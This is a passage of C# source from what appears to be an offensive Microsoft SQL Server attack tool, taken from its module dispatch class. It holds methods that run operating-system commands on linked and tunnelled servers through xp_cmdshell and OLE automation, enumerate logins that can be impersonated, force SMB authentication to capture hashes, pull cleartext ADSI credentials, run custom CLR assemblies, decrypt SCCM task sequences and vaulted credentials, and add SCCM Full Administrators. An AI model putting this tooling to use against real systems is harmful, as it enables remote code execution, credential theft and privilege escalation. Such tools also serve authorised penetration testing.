            string currentUserQuery = "SELECT SYSTEM_USER;";
            string currentUserResult = _sqlQuery.ExecuteLinkedCustomQuery(_connection, _linkedSqlServer, currentUserQuery);
            string currentUser = _sqlQuery.ExtractColumnValues(currentUserResult, "column0").FirstOrDefault();

            _print.Status($"Connected to {_linkedSqlServer} from {_sqlServer} with server user '{currentUser}'", true);

            // Query to check if the current user on the linked server is a sysadmin
            string sysAdminCheckQuery = "SELECT IS_SRVROLEMEMBER('sysadmin');";
            string isSysAdmin = _sqlQuery.ExecuteLinkedCustomQuery(_connection, _linkedSqlServer, sysAdminCheckQuery);

            if (isSysAdmin.Contains("1"))
            {
                _print.Status("The user can impersonate any account on the linked server.", true);
                string allLoginsQuery = "SELECT name FROM sys.server_principals WHERE type_desc IN ('SQL_LOGIN', 'WINDOWS_LOGIN') AND name NOT LIKE '##%';";
                string allLogins = _sqlQuery.ExecuteLinkedCustomQuery(_connection, _linkedSqlServer, allLoginsQuery);
                Console.WriteLine(!string.IsNullOrWhiteSpace(allLogins) ? allLogins : "No logins found to impersonate on the linked server.");
            }
            else
            {
                string allLoginsQuery = "SELECT name FROM sys.server_principals WHERE type_desc IN ('SQL_LOGIN', 'WINDOWS_LOGIN') AND name NOT LIKE '##%';";
                string allLogins = _sqlQuery.ExecuteLinkedCustomQuery(_connection, _linkedSqlServer, allLoginsQuery);

                if (!string.IsNullOrWhiteSpace(allLogins))
                {
                    foreach (var login in allLogins.Split(new[] { '\n' }, StringSplitOptions.RemoveEmptyEntries).Skip(1)) // Skip header
                    {
                        string user = login.Trim().Split('|')[0].Trim(); // Extract the username
                                                                         // Directly check for impersonation possibility for each user
                        string impersonateCheckQuery = $"SELECT 1 FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE' AND b.name = '{user.Replace("'", "''")}'";
                        string impersonateCheckResult = _sqlQuery.ExecuteLinkedCustomQuery(_connection, _linkedSqlServer, impersonateCheckQuery);

                        if (!string.IsNullOrWhiteSpace(impersonateCheckResult))
                        {
                            Console.WriteLine($"{user} can potentially be impersonated on the linked server {_linkedSqlServer}.");
                        }
                    }
                }
                else
                {
                    Console.WriteLine("No logins found to check for impersonation on the linked server.");
                }
            }
        }


        /// <summary>
        /// The lolecmd method is used against linked SQL servers to
        /// execute a user supplied command.
        /// This method needs to be public as reflection is used to match the
        /// module name that is supplied via command line, to the actual method name.
        /// <summary>
        public static void lolecmd()
        {
            _print.Status(string.Format("Executing '{0}' on {1} via {2}",
                _arg1, _linkedSqlServer, _sqlServer), true);
            _ole.Linked(_connection, _arg1, _linkedSqlServer);
        }

        /// <summary>
        /// The lquery method is used against linked SQL servers to
        /// execute a user supplied SQL command.
        /// This method needs to be public as reflection is used to match the
        /// module name that is supplied via command line, to the actual method name.
        /// <summary>
        public static void lquery()
        {
            _print.Status(string.Format("Executing '{0}' on {1} via {2}",
                _arg1, _linkedSqlServer, _sqlServer), true);
            _print.IsOutputEmpty(_sqlQuery.ExecuteLinkedCustomQuery(
                _connection, _linkedSqlServer, _arg1), true);
        }

        /// <summary>
        /// The lrows method is used against linked SQL servers to
        /// determine the number of rows in a table.
        /// This method needs to be public as reflection is used to match the
        /// module name that is supplied via command line, to the actual method name.
        /// </summary>
        public static void lrows()
        {
            // First check to see if rpc is enabled.
            _query = _config.ModuleStatus(_connection, "rpc", "null", _linkedSqlServer);
            if (!_query.Contains("1"))
            {
                _print.Error(string.Format("You need to enable RPC for {1} on {0} (enablerpc /rhost:{1}).",
                   _sqlServer, _linkedSqlServer), true);
                // Go no futher.
                return;
            }

            _print.Status(string.Format("Displaying number of rows from '{1}' in '{0}' on {2} via {3}",
                _arg1, _arg2, _linkedSqlServer, _sqlServer), true);

            _query = "use " + _arg1 + ";" +
                "SELECT COUNT(*) as row_count FROM " + _arg2 + ";";

            _print.IsOutputEmpty(_sqlQuery.ExecuteLinkedCustomQueryRpcExec(
                _connection, _linkedSqlServer, _query), true);
        }

        /// <summary>
        /// The lsearch method is used against linked SQL servers to
        /// search a table for a specific column name.
        /// This method needs to be public as reflection is used to match the
        /// module name that is supplied via command line, to the actual method name.
        /// <summary>
        public static void lsearch()
        {
            // First check to see if rpc is enabled.
            _query = _config.ModuleStatus(_connection, "rpc", "null", _linkedSqlServer);
            if (!_query.Contains("1"))
            {
                _print.Error(string.Format("You need to enable RPC for {1} on {0} (enablerpc -o {1}).",
                    _sqlServer, _linkedSqlServer), true);
                // Go no futher.
                return;
            }

            _print.Status(string.Format("Searching for columns containing '{0}' on {1} in '{2}' via {3}",
                _arg2, _linkedSqlServer, _arg1, _sqlServer), true);

            _query = "use " + _arg1 + ";" +
                "SELECT table_name, column_name " +
                "FROM INFORMATION_SCHEMA.COLUMNS WHERE column_name LIKE ''%" + _arg2 + "%'';";

            _print.IsOutputEmpty(_sqlQuery.ExecuteLinkedCustomQueryRpcExec(
                _connection, _linkedSqlServer, _query), true);
        }

        /// <summary>
        /// The lsmb method is used against linked SQL servers to
        /// make the linked SQL server solicit a SMB request to an arbitrary host.
        /// This method needs to be public as reflection is used to match the
        /// module name that is supplied via command line, to the actual method name.
        /// <summary>
        public static void lsmb()
        {
            CaptureHash _ = new(_connection, _arg1, _linkedSqlServer);
            _print.Status(string.Format("SMB Request from {0} to {1} via {2}.",
                _linkedSqlServer, _arg1, _sqlServer), true);
        }

        /// <summary>
        /// The ltables method is used against linked SQL servers to
        /// retrieve the tables from the user supplied database.
        /// This method needs to be public as reflection is used to match the
        /// module name that is supplied via command line, to the actual method name.
        /// <summary>
        public static void ltables()
        {
            _print.Status(string.Format("Tables in database '{0}' on {1} via {2}",
                _arg1, _linkedSqlServer, _sqlServer), true);
            _query = "SELECT * FROM " + _arg1 + ".INFORMATION_SCHEMA.TABLES;";
            _print.IsOutputEmpty(_sqlQuery.ExecuteLinkedCustomQuery(
                _connection, _linkedSqlServer, _query), true);
        }


        /// <summary>
        /// The lxpcmd method is used against linked SQL servers to
        ///  execute a user supplied command.
        /// This method needs to be public as reflection is used to match the
        /// module name that is supplied via command line, to the actual method name.
        /// <summary>
        public static void lxpcmd()
        {
            _print.Status(string.Format("Executing '{0}' on {1} via {2}.",
                _arg1, _linkedSqlServer, _sqlServer), true);
            _xpCmdShell.Linked(_connection, _arg1, _linkedSqlServer);
        }

        /*
         * *****************************************************************
         * *****************************************************************
         * *****************************************************************
         * ***************     Tunnel SQL Server Modules    ****************
         * *****************************************************************
         * *****************************************************************
         * *****************************************************************
         */

        /// <summary>
        /// The tquery method is used against a chain of linked SQL servers to
        /// execute a user supplied SQL command.
        /// This method needs to be public as reflection is used to match the
        /// module name that is supplied via command line, to the actual method name.
        /// <summary>
        public static void tquery()
        {
            _print.Status($"Executing '{_arg1}' from tunnel {_tunnelPath}", true);
            _print.IsOutputEmpty(_sqlQuery.ExecuteTunnelCustomQuery(
                _connection, _tunnelSqlServer, _arg1), true);
        }


        public static void timpersonate()
        {

            // Display the current server user
            string currentUserQuery = "SELECT SYSTEM_USER;";
            string currentUserResult = _sqlQuery.ExecuteTunnelCustomQuery(_connection, _tunnelSqlServer, currentUserQuery);
            string currentUser = currentUserResult.Split('\n').Skip(2).FirstOrDefault()?.Trim().TrimEnd(new char[] { ' ', '|' });

            _print.Success($"Tunneled through {_tunnelPath} and emerging with the user '{currentUser}'", true);

            // Query to check if the current user on the last server in the tunnel is a sysadmin
            string sysAdminCheckQuery = "SELECT IS_SRVROLEMEMBER('sysadmin');";
            string isSysAdmin = _sqlQuery.ExecuteTunnelCustomQuery(_connection, _tunnelSqlServer, sysAdminCheckQuery);

            if (isSysAdmin.Contains("1"))
            {
                _print.Status("The user can impersonate any account on the linked server.", true);
                string allLoginsQuery = "SELECT name FROM sys.server_principals WHERE type_desc IN ('SQL_LOGIN', 'WINDOWS_LOGIN') AND name NOT LIKE '##%';";
                string allLogins = _sqlQuery.ExecuteTunnelCustomQuery(_connection, _tunnelSqlServer, allLoginsQuery);
                Console.WriteLine(!string.IsNullOrWhiteSpace(allLogins) ? allLogins : "No logins found to impersonate on the linked server.");
            }
            else
            {
                // Enumerate all users and check which ones can be impersonated
                string allLoginsQuery = "SELECT name FROM sys.server_principals WHERE type_desc IN ('SQL_LOGIN', 'WINDOWS_LOGIN') AND name NOT LIKE '##%';";
                string allLogins = _sqlQuery.ExecuteTunnelCustomQuery(_connection, _tunnelSqlServer, allLoginsQuery);

                if (!string.IsNullOrWhiteSpace(allLogins))
                {
                    foreach (var login in allLogins.Split(new[] { '\n' }, StringSplitOptions.RemoveEmptyEntries).Skip(1))
                    {
                        string user = login.Trim().Split('|')[0].Trim(); // Extract the username
                                                                         // Directly check for impersonation possibility for each user
                        string impersonateCheckQuery = $"SELECT 1 FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE' AND b.name = '{user.Replace("'", "''")}'";
                        string impersonateCheckResult = _sqlQuery.ExecuteTunnelCustomQuery(_connection, _tunnelSqlServer, impersonateCheckQuery);

                        if (!string.IsNullOrWhiteSpace(impersonateCheckResult))
                        {
                            Console.WriteLine($"{user} can potentially be impersonated on the linked server.");
                        }
                    }
                }
                else
                {
                    Console.WriteLine("No logins found to check for impersonation on the linked server.");
                }
            }
        }


        /*
         * *****************************************************************
         * *****************************************************************
         * *****************************************************************
         * *************** Impersonation SQL Server Modules ****************
         * *****************************************************************
         * *****************************************************************
         * *****************************************************************
         */

        /// <summary>
        /// The iadsi method is used in conjunction with an account that can be
        /// impersonated to obtain cleartext ADSI credentials.
        /// This method needs to be public as reflection is used to match the
        /// module name that is supplied via command line, to the actual method name.
        /// <summary>
        public static void iadsi()
        {
            _print.Status(string.Format("Obtaining ADSI credentials for '{1}' on {0} as '{2}'",
                _sqlServer, _arg1, _impersonate), true);
            _adsi.Impersonate(_connection, _arg1, _arg2, _impersonate);
        }

        /// <summary>
        /// The iagentcmd method is used in conjunction with an account that can be
        /// impersonated to execute commands via agent jobs.
        /// This method needs to be public as reflection is used to match the
        /// module name that is supplied via command line, to the actual method name.
        /// <summary>
        public static void iagentcmd()
        {
            _print.Status(string.Format("Executing '{0}' as '{1}' on {2}",
                _arg1, _impersonate, _sqlServer), true);
            _agentJobs.Impersonate(_connection, _sqlServer, _arg1, _impersonate);
        }

        /// <summary>
        /// The iagentstatus method is used in conjunction with an account that can be
        /// impersonated to check if SQL server agent is running.
        /// This method needs to be public as reflection is used to match the
        /// module name that is supplied via command line, to the actual method name.
        /// <summary>
        public static void iagentstatus()
        {
            _print.Status(string.Format("Getting SQL agent status on {0} as '{1}'",
                _sqlServer, _impersonate), true);
            _agentJobs.GetAgentStatusAndJobs(_connection, _sqlServer, _impersonate);
        }

        /// <summary>
        /// The icheckrpc method is used in conjunction with an account that can be
        /// impersonated against the initial SQL server to identify what systems can
        /// have RPC enabled.
        /// This method needs to be public as reflection is used to match the
        /// module name that is supplied via command line, to the actual method name.
        /// <summary>
        public static void icheckrpc()
        {
            _print.Status(string.Format("The following SQL servers can have RPC " +
                "configured via {0} as '{1}'", _sqlServer, _impersonate), true);
            _query = "SELECT name, is_rpc_out_enabled FROM sys.servers";
            _print.IsOutputEmpty(_sqlQuery.ExecuteImpersonationCustomQuery(
                _connection, _impersonate, _query), true);
        }

        /// <summary>
        /// The icolumns method is used in conjunction with an account that can be
        /// impersonated to list the columns for a table in a database.
        /// This method needs to be public as reflection is used to match the
        /// module name that is supplied via command line, to the actual method name.
        /// </summary>
        public static void icolumns()
        {
            _print.Status(string.Format("Displaying columns from '{0}' in '{2}' as '{1}' on {3}",
                _arg2, _impersonate, _arg1, _sqlServer), true);

            _query = "use " + _arg1 + ";" +
                "SELECT COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS " +
                "WHERE TABLE_NAME = '" + _arg2 + "' ORDER BY ORDINAL_POSITION;";

            _print.IsOutputEmpty(_sqlQuery.ExecuteImpersonationCustomQuery(
                _connection, _impersonate, _query), true);
        }

        /// <summary>
        /// The iclr method is used in conjunction with an account that can be
        /// impersonated to execute custom .NET CLR assemblies.
        /// This method needs to be public as reflection is used to match the
        /// module name that is supplied via command line, to the actual method name.
        /// <summary>
        public static void iclr()
        {
            _print.Status(string.Format("Performing CLR custom assembly attack as '{0}' on {1}",
                _impersonate, _sqlServer), true);
            _clr.Impersonate(_connection, _arg1, _arg2, _impersonate);
        }

        /// <summary>
        /// The idatabases method is used in conjunction with an account that can be
        /// impersonated to show all configured databases.
        /// This method needs to be public as reflection is used to match the
        /// module name that is supplied via command line, to the actual method name.
        /// <summary>
        public static void idatabases()
        {
            _print.Status(string.Format("Databases on {0}", _sqlServer), true);

            _query = "SELECT dbid, name, crdate, filename FROM master.dbo.sysdatabases;";

            Console.WriteLine(_sqlQuery.ExecuteImpersonationCustomQuery(
                _connection, _impersonate, _query));
        }

        /// <summary>
        /// The idisableclr method is used in conjunction with an account that can be
        /// impersonated to disable CLR integration.
        /// This method needs to be public as reflection is used to match the
        /// module name that is supplied via command line, to the actual method name.
        /// <summary>
        public static void idisableclr()
        {
            _print.Status(string.Format("Disabling CLR Integration as '{0}' on {1}",
                _impersonate, _sqlServer), true);
            _config.ModuleToggle(_connection, "clr enabled", "0", _sqlServer, _impersonate);
        }

        /// <summary>
        /// The idisableole method is used in conjunction with an account that can be
        /// impersonated to disable OLE automation.
        /// This method needs to be public as reflection is used to match the
        /// module name that is supplied via command line, to the actual method name.
        /// <summary>
        public static void idisableole()
        {
            _print.Status(string.Format("Disabling Ole Automation Procedures as '{0}' on {1}",
                _impersonate, _sqlServer), true);
            _config.ModuleToggle(_connection, "Ole Automation Procedures", "0",
                _sqlServer, _impersonate);
        }

        /// <summary>
        /// The idisablerpc method is used against the initial SQL server to
        /// disable 'rpc out' on a specified SQL server with an account that can be
        /// impersonated.
        /// This method needs to be public as reflection is used to match the
        /// module name that is supplied via command line, to the actual method name.
        /// <summary>
        public static void idisablerpc()
        {
            _print.Status(string.Format("Disabling RPC on {0}", _arg1), true);
            _config.ModuleToggle(_connection, "rpc", "false", _arg1, _impersonate);
        }

        /// <summary>
        /// The idisablexp method is used in conjunction with an account that can be
        /// impersonated to disable xp_cmdshell.
        /// This method needs to be public as reflection is used to match the
        /// module name that is supplied via command line, to the actual method name.
        /// <summary>
        public static void idisablexp()
        {
            _print.Status(string.Format("Disabling xp_cmdshell as '{0}' on {1}",
                _impersonate, _sqlServer), true);
            _config.ModuleToggle(_connection, "xp_cmdshell", "0", _sqlServer, _impersonate);
        }

        /// <summary>
        /// The ienableclr method is used in conjunction with an account that can be
        /// impersonated to enable CLR integration.
        /// This method needs to be public as reflection is used to match the
        /// module name that is supplied via command line, to the actual method name.
        /// <summary>
        public static void ienableclr()
        {
            _print.Status(string.Format("Enabling CLR Integration as '{0}' on {1}",
                _impersonate, _sqlServer), true);
            _config.ModuleToggle(_connection, "clr enabled", "1", _sqlServer, _impersonate);
        }

        /// <summary>
        /// The ienableole method is used in conjunction with an account that can be
        /// impersonated to enable OLE automation.
        /// This method needs to be public as reflection is used to match the
        /// module name that is supplied via command line, to the actual method name.
        /// <summary>
        public static void ienableole()
        {
            _print.Status(string.Format("Enabling Ole Automation Procedures as '{0}' on {1}",
                _impersonate, _sqlServer), true);
            _config.ModuleToggle(_connection, "Ole Automation Procedures", "1",
                _sqlServer, _impersonate);
        }

        /// <summary>
        /// The ienablerpc method is used against the initial SQL server to
        /// enable 'rpc out' on a specified SQL server with an account that can be
        /// impersonated.
        /// This method needs to be public as reflection is used to match the
        /// module name that is supplied via command line, to the actual method name.
        /// <summary>
        public static void ienablerpc()
        {
            _print.Status(string.Format("Enabling RPC on {0}", _arg1), true);
            _config.ModuleToggle(_connection, "rpc", "true", _arg1, _impersonate);
        }

        /// <summary>
        /// The ienablexp method is used in conjunction with an account that can be
        /// impersonated to enable xp_cmdshell.
        /// This method needs to be public as reflection is used to match the
        /// module name that is supplied via command line, to the actual method name.
        /// <summary>
        public static void ienablexp()
        {
            _print.Status(string.Format("Enabling xp_cmdshell as '{0}' on {1}",
                _impersonate, _sqlServer), true);
            _config.ModuleToggle(_connection, "xp_cmdshell", "1", _sqlServer, _impersonate);
        }


        /// <summary>
        /// The ilinks method is used in conjunction with an account that can be
        /// impersonated to determine if the remote SQL server has a link configured
        /// to other SQL servers.
        /// This method needs to be public as reflection is used to match the
        /// module name that is supplied via command line, to the actual method name.
        /// </summary>
        public static void ilinks()
        {
            _print.Status(string.Format("Obtaining additional SQL links on {0} as '{1}'",
                _sqlServer, _impersonate), true);
            _query = "SELECT name, product, provider, data_source FROM " +
                "sys.servers WHERE is_linked = 1;";
            _print.IsOutputEmpty(_sqlQuery.ExecuteImpersonationCustomQuery(
                _connection, _impersonate, _query), true);
        }

        /// <summary>
        /// The iolecmd method is used in conjunction with an account that can be
        /// impersonated to execute a user supplied command.
        /// This method needs to be public as reflection is used to match the
        /// module name that is supplied via command line, to the actual method name.
        /// <summary>
        public static void iolecmd()
        {
            _print.Status(string.Format("Executing '{0}' as '{1}' on {2}",
                _arg1, _impersonate, _sqlServer), true);
            _ole.Impersonate(_connection, _arg1, _impersonate);
        }

        /// <summary>
        /// The iquery method is used in conjunction with an account that can be
        /// impersonated to execute a user supplied SQL query.
        /// This method needs to be public as reflection is used to match the
        /// module name that is supplied via command line, to the actual method name.
        /// <summary>
        public static void iquery()
        {
            _print.Status(string.Format("Executing '{0}' as '{1}' on {2}",
                _arg1, _impersonate, _sqlServer), true);
            _print.IsOutputEmpty(_sqlQuery.ExecuteImpersonationCustomQuery(
                _connection, _impersonate, _arg1), true);
        }

        /// <summary>
        /// The irows method is used in conjunction with an account that can be
        /// impersonated to determine the number of rows in a table.
        /// This method needs to be public as reflection is used to match the
        /// module name that is supplied via command line, to the actual method name.
        /// </summary>
        public static void irows()
        {
            _print.Status(string.Format("Displaying number of rows from '{0}' in '{2}' as '{1}' on {3}",
                _arg2, _impersonate, _arg1, _sqlServer), true);

            _query = "use " + _arg1 + ";" +
                "SELECT COUNT(*) as row_count FROM " + _arg2 + ";";

            _print.IsOutputEmpty(_sqlQuery.ExecuteImpersonationCustomQuery(
                _connection, _impersonate, _query), true);
        }

        /// <summary>
        /// The isearch method is used in conjunction with an account that can be
        /// impersonated to search a table for a specific column name.
        /// This method needs to be public as reflection is used to match the
        /// module name that is supplied via command line, to the actual method name.
        /// <summary>
        public static void isearch()
        {
            _print.Status(string.Format("Searching for columns containing '{0}' as '{1}' in {2}",
                _arg1, _impersonate, _database), true);
            _query = "SELECT table_name, column_name " +
                "FROM INFORMATION_SCHEMA.COLUMNS WHERE column_name LIKE '%" + _arg1 + "%';";
            _print.IsOutputEmpty(_sqlQuery.ExecuteImpersonationCustomQuery(
                _connection, _impersonate, _query), true);
        }

        /// <summary>
        /// The itables method is used in conjunction with an account that can be
        /// impersonated to retrieve the tables from the user supplied database.
        /// This method needs to be public as reflection is used to match the
        /// module name that is supplied via command line, to the actual method name.
        /// <summary>
        public static void itables()
        {
            _print.Status(string.Format("Displaying Tables in {0} as '{1}'",
                _arg1, _impersonate), true);
            _query = "SELECT * FROM " + _arg1 + ".INFORMATION_SCHEMA.TABLES;";
            _print.IsOutputEmpty(_sqlQuery.ExecuteImpersonationCustomQuery(
                _connection, _impersonate, _query), true);
        }


        /// <summary>
        /// The ixpcmd method is used in conjunction with an account that can be
        /// impersonated to execute a user supplied command.
        /// This method needs to be public as reflection is used to match the
        /// module name that is supplied via command line, to the actual method name.
        /// <summary>
        public static void ixpcmd()
        {
            _print.Status(string.Format("Executing '{0}' as '{1}' on {2}.",
                _arg1, _impersonate, _sqlServer), true);
            _xpCmdShell.Impersonate(_connection, _arg1, _impersonate);
        }

        /*
         * *************************************************************
         * *************************************************************
         * *************************************************************
         * ****************** SCCM SQL Server Modules ******************
         * *************************************************************
         * *************************************************************
         * *************************************************************
         */

        /// <summary>
        /// The susers method lists all users in the RBAC_Admins table.
        /// This method needs to be public as reflection is used to match the
        /// module name that is supplied via command line, to the actual method name.
        /// </summary>
        public static void susers()
        {
            _sccm.SccmUsers(_connection);
        }

        /// <summary>
        /// The ssites method lists all sites stored in the SCCM databases' 'DPInfo' table.
        /// This can provide additional attack avenues as different sites
        /// This method needs to be public as reflection is used to match the
        /// module name that is supplied via command line, to the actual method name.
        /// </summary>
        public static void ssites()
        {
            _sccm.SccmSites(_connection);
        }

        /// <summary>
        /// The SccmClientLogons method queries the 'Computer_System_DATA' table to
        /// retrieve all associated SCCM clients along with the user that last logged into them.
        /// NOTE: This only updates once a week by default and will not be 100% up to date.
        /// This method needs to be public as reflection is used to match the
        /// module name that is supplied via command line, to the actual method name.
        /// </summary>
        public static void slogons()
        {
            _sccm.SccmClientLogons(_connection, _arg0);
        }

        /// <summary>
        /// The stasklist method provides a list of all task sequences stored
        /// in the SCCM database, but does not access the actual task data contents.
        /// This method needs to be public as reflection is used to match the
        /// module name that is supplied via command line, to the actual method name.
        /// </summary>
        public static void stasklist()
        {
            _sccm.SccmTaskSequenceList(_connection);
        }

        /// <summary>
        /// The staskdata method recovers all task sequences stored in the SCCM
        /// database and decrypts them to plaintext.
        /// This method needs to be public as reflection is used to match the
        /// module name that is supplied via command line, to the actual method name.
        /// </summary>
        public static void staskdata()
        {
            _sccm.GetTaskSequenceData(_connection);
        }

        /// <summary>
        /// The scredentials method lists credentials vaulted by SCCM for
        /// use in various functions. These credentials can not be remotely decrypted
        /// as the key is stored on the SCCM server. However, this module provides
        /// intel on if it makes sense to attempt to obtain the key.
        /// This method needs to be public as reflection is used to match the
        /// module name that is supplied via command line, to the actual method name.
        /// </summary>
        public static void scredentials()
        {
            _sccm.TriageVaultedCredentials(_connection);
        }

        /// <summary>
        /// The sdecryptcredentials method recovers encrypted credential string
        /// for accounts vaulted in SCCM and attempts to use the Microsoft Systems Management Server CSP
        /// to attempt to decrypt them to plaintext. Uses the logic from @XPN's initial PoC SCCM secret decryption gist:
        /// https://gist.github.com/xpn/5f497d2725a041922c427c3aaa3b37d1
        /// This function must be ran from an SCCM management server in a context
        /// that has the ability to access this CSP (high-integrity admin or SYSTEM).
        /// This method needs to be public as reflection is used to match the
        /// module name that is supplied via command line, to the actual method name.
        /// </summary>
        public static void sdecryptcredentials()
        {
            _sccm.DecryptVaultedCredentials(_connection);
        }

        /// <summary>
        /// The AddSCCMAdmin method will elevate the specified account to a 'Full Administrator'
        /// within SCCM. If target user is already an SCCM user, this module will instead add necessary
        /// privileges to elevate. This module require sysadmin or similar privileges as writing to
        /// SCCM database tables is required.
        /// This method needs to be public as reflection is used to match the
        /// module name that is supplied via command line, to the actual method name.
        /// </summary>
        public static void saddadmin()
        {
            _sccm.AddSCCMAdmin(_connection, _arg1, _arg2);
        }

        /// <summary>
        /// The RemoveSCCMAdmin method removes the privileges of a user by removing a user
        /// entirely from the SCCM database. Use the arguments provided by output of the
        /// AddSCCMAdmin command to run this command. This module require sysadmin or
        /// similar privileges as writing to SCCM database tables is required.
        /// This method needs to be public as reflection is used to match the
        /// module name that is supplied via command line, to the actual method name.
        /// </summary>
        public static void sremoveadmin()
        {
            _sccm.RemoveSCCMAdmin(_connection, _arg1, _arg2);
        }
    }
}